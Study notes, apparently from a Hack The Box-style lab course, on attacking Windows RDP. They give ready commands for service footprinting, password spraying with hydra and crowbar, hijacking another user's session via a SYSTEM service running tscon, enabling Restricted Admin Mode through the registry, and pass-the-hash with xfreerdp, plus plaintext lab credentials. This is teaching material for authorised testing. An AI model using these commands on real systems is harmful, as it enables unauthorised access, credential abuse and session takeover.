## Footprinting the Service
```shell
nmap -sV -sC 10.129.201.248 -p3389 --script rdp*
```
In addition, we can use `--packet-trace` to track the individual packages and inspect their contents manually.
```shell
nmap -sV -sC 10.129.201.248 -p3389 --packet-trace --disable-arp-ping -n
```
A Perl script named [rdp-sec-check.pl](https://github.com/CiscoCXSecurity/rdp-sec-check) has also been developed by [Cisco CX Security Labs](https://github.com/CiscoCXSecurity) that can unauthentically identify the security settings of RDP servers based on the handshakes.
#### RDP Security Check - Installation
```shell
MarcosV999@htb[/htb]$ sudo cpan
```
#### RDP Security Check
```shell
MarcosV999@htb[/htb]$ git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
MarcosV999@htb[/htb]$ ./rdp-sec-check.pl 10.129.201.248
```
#### Initiate an RDP Session
```bash
xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248
xfreerdp /v:IP /u:Administrator /p:'87N1ns@slls83' /dynamic-resolution
```
#### Password spraying
```bash
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```
#### RDP Session Hijacking
![](Pasted%20image%2020261002102618.png)
```
PS C:\Users\jurena> query user
```
To successfully impersonate a user without their password, we need to have `SYSTEM` privileges and use the Microsoft [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) binary that enables users to connect to another desktop session. It works by specifying which `SESSION ID` (`4` for the `lewen` session in our example) we would like to connect to which session name (`rdp-tcp#13`, which is our current session). So, for example, the following command will open a new console as the specified `SESSION_ID` within our current RDP session:
```
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```
If we have local administrator privileges, we can use several methods to obtain `SYSTEM` privileges, such as [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) or [Mimikatz](https://github.com/gentilkiwi/mimikatz). A simple trick is to create a Windows service that, by default, will run as `Local System` and will execute any binary with `SYSTEM` privileges. We will use [Microsoft sc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) binary. First, we specify the service name (`sessionhijack`) and the `binpath`, which is the command we want to execute. Once we run the following command, a service named `sessionhijack` will be created.
```
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

[SC] CreateService SUCCESS
```
To run the command, we can start the `sessionhijack` service :
```
C:\htb> net start sessionhijack
```
Once the service is started, a new terminal with the `lewen` user session will appear. With this new account, we can attempt to discover what kind of privileges it has on the network, and maybe we'll get lucky, and the user is a member of the Help Desk group with admin rights to many hosts or even a Domain Admin.
_Note: This method no longer works on Server 2019._
## RDP Pass-the-Hash (PtH)
There are a few caveats to this attack:

- `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, we will be prompted with the following error:
```
Account restrictions are preventing this user from signing in. For example: blank passwords aren't allowed, sign-in times are limited, or a policy restriction has been enforced.
```
This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`. It can be done using the following command:
```
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
![](Pasted%20image%2020261002103329.png)
Once the registry key is added, we can use `xfreerdp` with the option `/pth` to gain RDP access:
```
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

